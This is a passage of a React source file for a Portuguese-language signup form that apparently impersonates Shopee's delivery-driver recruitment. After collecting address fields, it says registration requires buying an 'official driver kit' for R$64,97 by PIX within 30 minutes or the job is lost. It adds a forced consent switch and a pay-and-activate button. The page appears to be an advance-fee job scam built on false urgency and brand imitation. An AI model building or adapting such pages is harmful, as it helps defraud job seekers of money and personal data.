                    {...register('complemento')}
                    placeholder="Apto, Bloco, etc."
                  />
                </div>
                
                <div>
                  <label htmlFor="bairro" className="block text-sm font-medium text-gray-700 mb-1">
                    Bairro
                  </label>
                  <Input
                    id="bairro"
                    {...register('bairro')}
                    placeholder="Bairro"
                    className={errors.bairro ? 'border-red-500' : ''}
                  />
                  {errors.bairro && (
                    <p className="mt-1 text-sm text-red-600">{errors.bairro.message}</p>
                  )}
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label htmlFor="cidade" className="block text-sm font-medium text-gray-700 mb-1">
                      Cidade
                    </label>
                    <Input
                      id="cidade"
                      {...register('cidade')}
                      placeholder="Cidade"
                      className={errors.cidade ? 'border-red-500' : ''}
                    />
                    {errors.cidade && (
                      <p className="mt-1 text-sm text-red-600">{errors.cidade.message}</p>
                    )}
                  </div>
                  
                  <div>
                    <label htmlFor="estado" className="block text-sm font-medium text-gray-700 mb-1">
                      Estado
                    </label>
                    <select
                      id="estado"
                      {...register('estado')}
                      className={`flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 ${errors.estado ? 'border-red-500' : ''}`}
                    >
                      <option value="">Selecione o estado</option>
                      <option value="AC">Acre</option>
                      <option value="AL">Alagoas</option>
                      <option value="AP">Amapá</option>
                      <option value="AM">Amazonas</option>
                      <option value="BA">Bahia</option>
                      <option value="CE">Ceará</option>
                      <option value="DF">Distrito Federal</option>
                      <option value="ES">Espírito Santo</option>
                      <option value="GO">Goiás</option>
                      <option value="MA">Maranhão</option>
                      <option value="MT">Mato Grosso</option>
                      <option value="MS">Mato Grosso do Sul</option>
                      <option value="MG">Minas Gerais</option>
                      <option value="PA">Pará</option>
                      <option value="PB">Paraíba</option>
                      <option value="PR">Paraná</option>
                      <option value="PE">Pernambuco</option>
                      <option value="PI">Piauí</option>
                      <option value="RJ">Rio de Janeiro</option>
                      <option value="RN">Rio Grande do Norte</option>
                      <option value="RS">Rio Grande do Sul</option>
                      <option value="RO">Rondônia</option>
                      <option value="RR">Roraima</option>
                      <option value="SC">Santa Catarina</option>
                      <option value="SP">São Paulo</option>
                      <option value="SE">Sergipe</option>
                      <option value="TO">Tocantins</option>
                    </select>
                    {errors.estado && (
                      <p className="mt-1 text-sm text-red-600">{errors.estado.message}</p>
                    )}
                  </div>
                </div>
                
                <div className="bg-[#FFF8F6] p-4 rounded-md border border-[#E83D2220] mb-4">
                  <div className="flex items-start">
                    <div className="text-[#E83D22] mr-3 mt-1">
                      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                      </svg>
                    </div>
                    <div>
                      <h4 className="text-sm font-medium text-[#E83D22]">Informação Importante:</h4>
                      <p className="text-sm text-gray-700">
                        Para ativar seu cadastro e se tornar um entregador Shopee, é obrigatório a aquisição do 
                        Kit Oficial de Entregador da Shopee. O kit é entregue a preço de custo por <strong>R$64,97</strong>.
                      </p>
                    </div>
                  </div>
                </div>
                
                {/* Box de alerta sobre o kit de segurança obrigatório */}
                <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
                  <div className="flex items-start">
                    <div className="text-red-500 mt-0.5 mr-3">
                      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                      </svg>
                    </div>
                    <div>
                      <h4 className="text-red-800 font-medium text-sm"><strong>ATENÇÃO:</strong> Aceite os termos e depois clique em "Comprar e Ativar Cadastro".</h4>
                      <p className="text-red-700 text-sm mt-1">
                        O pagamento do Kit de Segurança do Entregador é <strong>obrigatório</strong> e você precisa 
                        adquirir este kit oficial para exercer a função de entregador Shopee.
                      </p>
                      <p className="text-red-700 text-sm mt-2">
                        Ao prosseguir, você se compromete a realizar o pagamento via PIX no prazo de 30 minutos, 
                        caso contrário, perderá o direito à vaga de entregador.
                      </p>
                      
                      {/* Botão on/off (switch) */}
                      <div className="mt-4 flex items-center">
                        <div className="mr-1 flex-shrink-0 w-[75px]">
                          <button 
                            className={`relative inline-flex h-7 w-16 items-center rounded-full transition-colors focus:outline-none ${acceptedTerms ? 'bg-green-500' : 'bg-gray-300'}`}
                            onClick={() => {
                              console.log("🎯 [ENTREGA] Switch clicado! Estado atual:", acceptedTerms, "-> Novo estado:", !acceptedTerms);
                              setAcceptedTerms(!acceptedTerms);
                            }}
                            type="button"
                            data-testid="terms-switch"
                          >
                            <span
                              className={`inline-block h-6 w-6 transform rounded-full bg-white shadow-md transition-transform ${acceptedTerms ? 'translate-x-9' : 'translate-x-1'}`}
                            />
                          </button>
                        </div>
                        <span className="ml-1 text-sm font-medium text-gray-700">
                          Concordo com os termos e me comprometo a realizar o pagamento
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
                
                <Button
                  type="submit"
                  form="endereco-form"
                  disabled={isLoading}
                  className={`w-full text-white font-medium py-6 text-base rounded-[3px] transition-all !bg-opacity-100 ${
                    isLoading 
                      ? '!bg-[#E83D22] cursor-not-allowed opacity-90' 
                      : acceptedTerms 
                        ? 'bg-[#E83D22] hover:bg-[#d73920]' 
                        : 'bg-[#E83D2280] hover:bg-[#E83D2290] pulse-animation'
                  }`}
                  style={{ height: '50px' }}
                  onClick={(e) => {
                    console.log("🎯 [ENTREGA] Botão clicado! acceptedTerms:", acceptedTerms);
                    if (isLoading) {
                      e.preventDefault();
                      return;
                    }
                    if (!acceptedTerms) {
                      e.preventDefault();
                      console.log("❌ [ENTREGA] Termos não aceitos, impedindo submit");
                      toast({
                        title: "⚠️ Aceite os termos primeiro",
                        description: "Clique no botão verde acima para aceitar os termos e depois tente novamente.",
                        variant: "destructive",
                      });
                      // Destacar o switch de termos
                      const termSwitch = document.querySelector('[data-testid="terms-switch"]');
                      if (termSwitch) {
                        termSwitch.scrollIntoView({ behavior: 'smooth', block: 'center' });
                        termSwitch.style.animation = 'bounce 0.6s ease-in-out 3';
                      }
                      return;
                    }
                    console.log("✅ [ENTREGA] Termos aceitos, permitindo submit");
                  }}
                  data-testid="button-submit"
                >
                  {isLoading ? (
                    <div className="flex items-center justify-center gap-2">
                      <Spinner className="h-5 w-5" />
                      <span>Carregando...</span>
                    </div>
                  ) : (
                    acceptedTerms ? 'Comprar e Ativar Cadastro' : '⚠️ Aceite os termos primeiro'
                  )}
                </Button>
              </form>
            </div>
          </div>
        </div>
      </div>
      
      <div className="container mx-auto px-4">
        <CommentsSection />
      </div>
      
      <Footer />
      
      
      {/* Modal de confirmação para o kit EPI - REMOVIDO - vai direto para pagamento */}
      {/* <EPIConfirmationModal
        isOpen={showConfirmationModal}
        onOpenChange={setShowConfirmationModal}
        onConfirm={processarPagamento}
      /> */}

    </div>
  );
};

export default Entrega;